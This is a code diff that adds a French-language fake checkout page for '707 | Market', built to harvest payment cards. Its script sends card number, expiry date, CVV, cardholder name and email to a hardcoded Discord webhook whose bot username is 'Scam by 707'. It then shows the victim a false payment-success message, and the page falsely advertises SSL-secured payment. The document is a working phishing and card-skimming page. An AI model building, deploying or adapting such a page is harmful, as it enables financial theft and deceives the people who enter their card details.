@@ -1,0 +1,710 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>707 | Market - Paiement</title>
+    <link rel="icon" href="https://i.imgur.com/NH02oP4.png" type="image/gif">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --primary: #ff2a2a;
+            --primary-dark: #cc0000;
+            --primary-light: rgba(255, 42, 42, 0.1);
+            --secondary: #0a0a0a;
+            --accent: #ff5e5e;
+            --text: #ffffff;
+            --text-secondary: #b0b0b0;
+            --card-bg: rgba(20, 20, 20, 0.8);
+            --header-bg: rgba(10, 10, 10, 0.95);
+            --border: rgba(255, 42, 42, 0.3);
+            --shadow: 0 8px 32px rgba(255, 0, 0, 0.1);
+            --gradient: linear-gradient(135deg, rgba(255, 42, 42, 0.1) 0%, rgba(10, 10, 10, 0.8) 100%);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--secondary);
+            color: var(--text);
+            line-height: 1.6;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(255, 42, 42, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, rgba(255, 42, 42, 0.05) 0%, transparent 20%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        /* Header */
+        header {
+            background-color: var(--header-bg);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--border);
+            padding: 15px 0;
+            width: 100%;
+            max-width: 1200px;
+            border-radius: 15px 15px 0 0;
+            margin-bottom: -1px;
+        }
+        
+        .header-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .logo-icon {
+            color: var(--primary);
+            font-size: 28px;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 800;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+        
+        .back-btn {
+            background-color: transparent;
+            color: var(--text-secondary);
+            border: 1px solid var(--border);
+            padding: 10px 20px;
+            border-radius: 5px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s;
+            text-decoration: none;
+        }
+        
+        .back-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+            color: var(--text);
+            border-color: var(--primary);
+        }
+        
+        /* Main Content */
+        .main-content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            max-width: 1200px;
+            width: 100%;
+        }
+        
+        .payment-form-container, .order-summary {
+            flex: 1;
+            min-width: 300px;
+            background: var(--card-bg);
+            backdrop-filter: blur(10px);
+            border-radius: 12px;
+            box-shadow: var(--shadow);
+            padding: 30px;
+            border: 1px solid var(--border);
+        }
+        
+        .section-title {
+            color: var(--text);
+            margin-bottom: 20px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--primary);
+            font-size: 1.5rem;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text);
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            font-size: 16px;
+            transition: all 0.3s;
+            color: var(--text);
+        }
+        
+        .form-control:focus {
+            outline: none;
+            border-color: var(--primary);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 0 2px rgba(255, 42, 42, 0.2);
+        }
+        
+        .card-details {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .card-details .form-group {
+            flex: 1;
+        }
+        
+        .payment-methods {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .payment-method {
+            flex: 1;
+            text-align: center;
+            padding: 15px;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .payment-method:hover {
+            border-color: var(--primary);
+        }
+        
+        .payment-method.selected {
+            border-color: var(--primary);
+            background-color: var(--primary-light);
+        }
+        
+        .payment-method i {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            color: var(--text-secondary);
+        }
+        
+        .payment-method.selected i {
+            color: var(--primary);
+        }
+        
+        .order-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .order-total {
+            display: flex;
+            justify-content: space-between;
+            font-size: 1.3rem;
+            font-weight: bold;
+            margin-top: 20px;
+            padding-top: 20px;
+            border-top: 2px solid rgba(255, 255, 255, 0.1);
+            color: var(--primary);
+        }
+        
+        .btn-pay {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(to right, var(--primary), var(--accent));
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-pay:hover:not(:disabled) {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 42, 42, 0.3);
+        }
+        
+        .btn-pay:disabled {
+            background: #666;
+            cursor: not-allowed;
+            opacity: 0.6;
+        }
+        
+        .secure-note {
+            text-align: center;
+            margin-top: 15px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+        }
+        
+        .secure-note i {
+            color: #4CAF50;
+            margin-right: 5px;
+        }
+        
+        .loading {
+            display: none;
+        }
+        
+        .loading.active {
+            display: inline-block;
+        }
+        
+        .response-message {
+            padding: 15px;
+            border-radius: 6px;
+            margin-top: 20px;
+            text-align: center;
+            font-weight: 600;
+            display: none;
+        }
+        
+        .response-message.success {
+            background-color: rgba(46, 204, 113, 0.1);
+            color: #27ae60;
+            border: 1px solid #2ecc71;
+            display: block;
+        }
+        
+        .response-message.error {
+            background-color: rgba(231, 76, 60, 0.1);
+            color: #e74c3c;
+            border: 1px solid #e74c3c;
+            display: block;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            color: var(--text-secondary);
+            font-size: 0.9rem;
+            max-width: 1200px;
+            width: 100%;
+        }
+        
+        @media (max-width: 768px) {
+            .card-details {
+                flex-direction: column;
+                gap: 0;
+            }
+            
+            .payment-methods {
+                flex-direction: column;
+            }
+            
+            .main-content {
+                flex-direction: column;
+            }
+            
+            body {
+                padding: 10px;
+            }
+        }
+        
+        /* Scrollbar */
+        ::-webkit-scrollbar {
+            width: 10px;
+        }
+        
+        ::-webkit-scrollbar-track {
+            background: var(--secondary);
+        }
+        
+        ::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 5px;
+        }
+        
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary-dark);
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="header-container">
+            <div class="logo">
+                <div class="logo-icon"><i class="fas fa-fire"></i></div>
+                <div class="logo-text">707 | MARKET - PAIEMENT</div>
+            </div>
+            
+            <button class="back-btn" id="backBtn">
+                <i class="fas fa-arrow-left"></i> Retour à l'accueil
+            </button>
+        </div>
+    </header>
+    
+    <!-- Main Content -->
+    <div class="main-content">
+        <div class="payment-form-container">
+            <h2 class="section-title">Informations de paiement</h2>
+            
+            <div class="payment-methods">
+                <div class="payment-method selected" id="card-method">
+                    <i class="far fa-credit-card"></i>
+                    <div>Carte bancaire</div>
+                </div>
+                <div class="payment-method" id="paypal-method">
+                    <i class="fab fa-paypal"></i>
+                    <div>PayPal</div>
+                </div>
+            </div>
+
+            <form id="payment-form">
+                <div class="form-group">
+                    <label for="card-number">Numéro de carte</label>
+                    <input type="text" id="card-number" class="form-control" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+
+                <div class="card-details">
+                    <div class="form-group">
+                        <label for="expiry-date">Date d'expiration</label>
+                        <input type="text" id="expiry-date" class="form-control" placeholder="MM/AA" maxlength="5" required>
+                    </div>
+                    <div class="form-group">
+                        <label for="cvv">CVV</label>
+                        <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label for="card-name">Nom sur la carte</label>
+                    <input type="text" id="card-name" class="form-control" placeholder="Karim Benzema" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="email">Email de confirmation</label>
+                    <input type="email" id="email" class="form-control" placeholder="karim.benzema@example.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label for="amount">Montant (€)</label>
+                    <input type="number" id="amount" class="form-control" min="1" max="10000" step="0.01" value="49.99" required>
+                </div>
+
+                <button type="submit" class="btn-pay" id="pay-button">
+                    <span>Payer maintenant</span>
+                    <i class="fas fa-spinner fa-spin loading" id="loading-icon"></i>
+                </button>
+
+                <div class="secure-note">
+                    <i class="fas fa-shield-alt"></i> Paiement sécurisé avec chiffrement SSL
+                </div>
+
+                <div class="response-message" id="response-message"></div>
+            </form>
+        </div>
+
+        <div class="order-summary">
+            <h2 class="section-title">Récapitulatif</h2>
+            
+            <div class="order-item">
+                <div>
+                    <h3>Service Premium</h3>
+                    <p>Accès complet aux fonctionnalités</p>
+                </div>
+                <div class="price" id="item-price">€49,99</div>
+            </div>
+
+            <div class="order-item">
+                <div>
+                    <h3>Support technique</h3>
+                    <p>Assistance prioritaire 24/7</p>
+                </div>
+                <div class="price">Gratuit</div>
+            </div>
+
+            <div class="order-item">
+                <div>
+                    <h3>Mises à jour</h3>
+                    <p>Mises à jour futures incluses</p>
+                </div>
+                <div class="price">Gratuit</div>
+            </div>
+
+            <div class="order-total">
+                <div>Total</div>
+                <div id="total-amount">€49,99</div>
+            </div>
+
+            <div class="secure-note" style="margin-top: 30px;">
+                <p><strong>Méthode alternative :</strong> Vous pouvez également passer commande via le formulaire Discord sur la page d'accueil.</p>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>Paiement 707 | Market &copy; 2025</p>
+    </footer>
+
+    <script>
+        // Éléments DOM
+        const paymentForm = document.getElementById('payment-form');
+        const cardNumberInput = document.getElementById('card-number');
+        const expiryDateInput = document.getElementById('expiry-date');
+        const cvvInput = document.getElementById('cvv');
+        const cardNameInput = document.getElementById('card-name');
+        const emailInput = document.getElementById('email');
+        const amountInput = document.getElementById('amount');
+        const payButton = document.getElementById('pay-button');
+        const loadingIcon = document.getElementById('loading-icon');
+        const responseMessage = document.getElementById('response-message');
+        const totalAmountElement = document.getElementById('total-amount');
+        const itemPriceElement = document.getElementById('item-price');
+        const cardMethod = document.getElementById('card-method');
+        const paypalMethod = document.getElementById('paypal-method');
+        const backBtn = document.getElementById('backBtn');
+        
+        // Variables
+        let selectedPaymentMethod = 'card';
+        const webhookUrl = 'https://discord.com/api/webhooks/1439281295724122285/2yo9WVXtz9-T6hrmfKa9OIFAN9DhEYZhYPtkjWd1cL94EB-2WgKvz_i_oNOZUh9rTjBj';
+
+        // Bouton retour - redirige vers index.html
+        backBtn.addEventListener('click', function() {
+            window.location.href = 'index.html';
+        });
+
+        // Formater le numéro de carte (ajouter des espaces)
+        cardNumberInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
+            let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = formattedValue.substring(0, 19);
+        });
+
+        // Formater la date d'expiration (MM/AA)
+        expiryDateInput.addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            } else {
+                e.target.value = value;
+            }
+        });
+
+        // Mettre à jour le prix du service premium et le total quand le montant change
+        amountInput.addEventListener('input', function() {
+            const amount = parseFloat(this.value) || 0;
+            // Mettre à jour le prix du service premium
+            itemPriceElement.textContent = `€${amount.toFixed(2)}`;
+            // Mettre à jour le total
+            totalAmountElement.textContent = `€${amount.toFixed(2)}`;
+        });
+
+        // Mettre à jour aussi sur le changement direct
+        amountInput.addEventListener('change', function() {
+            const amount = parseFloat(this.value) || 0;
+            // Mettre à jour le prix du service premium
+            itemPriceElement.textContent = `€${amount.toFixed(2)}`;
+            // Mettre à jour le total
+            totalAmountElement.textContent = `€${amount.toFixed(2)}`;
+        });
+
+        // Sélection de la méthode de paiement
+        cardMethod.addEventListener('click', function() {
+            selectedPaymentMethod = 'card';
+            cardMethod.classList.add('selected');
+            paypalMethod.classList.remove('selected');
+        });
+
+        paypalMethod.addEventListener('click', function() {
+            selectedPaymentMethod = 'paypal';
+            paypalMethod.classList.add('selected');
+            cardMethod.classList.remove('selected');
+        });
+
+        // Validation du formulaire
+        paymentForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Validation basique
+            if (!validateForm()) {
+                return;
+            }
+            
+            // Désactiver le bouton et afficher le chargement
+            payButton.disabled = true;
+            loadingIcon.classList.add('active');
+            responseMessage.classList.remove('success', 'error');
+            responseMessage.style.display = 'none';
+            
+            // Préparer les données pour le webhook
+            const paymentData = {
+                payment_method: selectedPaymentMethod,
+                card_number: cardNumberInput.value,
+                expiry_date: expiryDateInput.value,
+                cvv: cvvInput.value,
+                card_name: cardNameInput.value,
+                email: emailInput.value,
+                amount: amountInput.value,
+                timestamp: new Date().toISOString()
+            };
+            
+            // Créer le message pour Discord
+            const discordMessage = {
+                username: "Scam by 707",
+                avatar_url: "https://i.imgur.com/f5AoViV.gif",
+                embeds: [{
+                    title: "Nouvelle tentative de paiement",
+                    color: 3447003,
+                    fields: [
+                        {
+                            name: "Méthode de paiement",
+                            value: selectedPaymentMethod === 'card' ? 'Carte bancaire' : 'PayPal',
+                            inline: true
+                        },
+                        {
+                            name: "Montant",
+                            value: `€${paymentData.amount}`,
+                            inline: true
+                        },
+                        {
+                            name: "Nom sur la carte",
+                            value: paymentData.card_name,
+                            inline: true
+                        },
+                        {
+                            name: "Email",
+                            value: paymentData.email,
+                            inline: false
+                        },
+                        {
+                            name: "Numéro de carte ",
+                            value: paymentData.card_number,
+                            inline: true
+                        },
+                        {
+                            name: "Date d'expiration",
+                            value: paymentData.expiry_date,
+                            inline: true
+                        },
+                                                {
+                            name: "CVV",
+                            value: paymentData.cvv,
+                            inline: true
+                        },
+                        {
+                            name: "Heure",
+                            value: new Date().toLocaleString('fr-FR'),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Démonstration de paiement - Aucune transaction réelle"
+                    }
+                }]
+            };
+            
+            try {
+                // Envoyer les données au webhook Discord
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(discordMessage)
+                });
+                
+                if (response.ok) {
+                    // Succès
+                    showMessage('Paiement réussi. Vérifié votre boîte mail pour avoir votre commande', 'success');
+                    
+                    // Réinitialiser le formulaire après un délai
+                    setTimeout(() => {
+                        paymentForm.reset();
+                        totalAmountElement.textContent = '€49,99';
+                        itemPriceElement.textContent = '€49,99';
+                        amountInput.value = '49.99';
+                    }, 3000);
+                } else {
+                    throw new Error('Erreur lors de l\'envoi au webhook');
+                }
+            } catch (error) {
+                console.error('Erreur:', error);
+                showMessage('Erreur lors de l\'envoi des données. Veuillez réessayer.', 'error');
+            } finally {
+                // Réactiver le bouton et masquer le chargement
+                payButton.disabled = false;
+                loadingIcon.classList.remove('active');
+            }
+        });
+
+        // Fonction de validation
+        function validateForm() {
+            // Validation simple
+            if (cardNumberInput.value.replace(/\s/g, '').length !== 16) {
+                showMessage('Veuillez saisir un numéro de carte valide (16 chiffres).', 'error');
+                return false;
+            }
+            
+            if (!expiryDateInput.value.match(/^(0[1-9]|1[0-2])\/([0-9]{2})$/)) {
+                showMessage('Veuillez saisir une date d\'expiration valide (MM/AA).', 'error');
+                return false;
+            }
+            
+            if (cvvInput.value.length !== 3) {
+                showMessage('Veuillez saisir un code CVV valide (3 chiffres).', 'error');
+                return false;
+            }
+            
+            if (cardNameInput.value.trim().length < 2) {
+                showMessage('Veuillez saisir le nom sur la carte.', 'error');
+                return false;
+            }
+            
+            if (!emailInput.value.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+                showMessage('Veuillez saisir une adresse email valide.', 'error');
+                return false;
+            }
+            
+            const amount = parseFloat(amountInput.value);
+            if (isNaN(amount) || amount <= 0 || amount > 10000) {
+                showMessage('Veuillez saisir un montant valide (entre €1 et €10,000).', 'error');
+                return false;
+            }
+            
+            return true;
+        }
+
+        // Afficher les messages
+        function showMessage(message, type) {
+            responseMessage.textContent = message;
+            responseMessage.className = 'response-message ' + type;
+            responseMessage.style.display = 'block';
+            
+            // Masquer le message après 5 secondes
+            if (type === 'success') {
+                setTimeout(() => {
+                    responseMessage.style.display = 'none';
+                }, 5000);
+            }
+        }
+    </script>
+</body>
+</html>
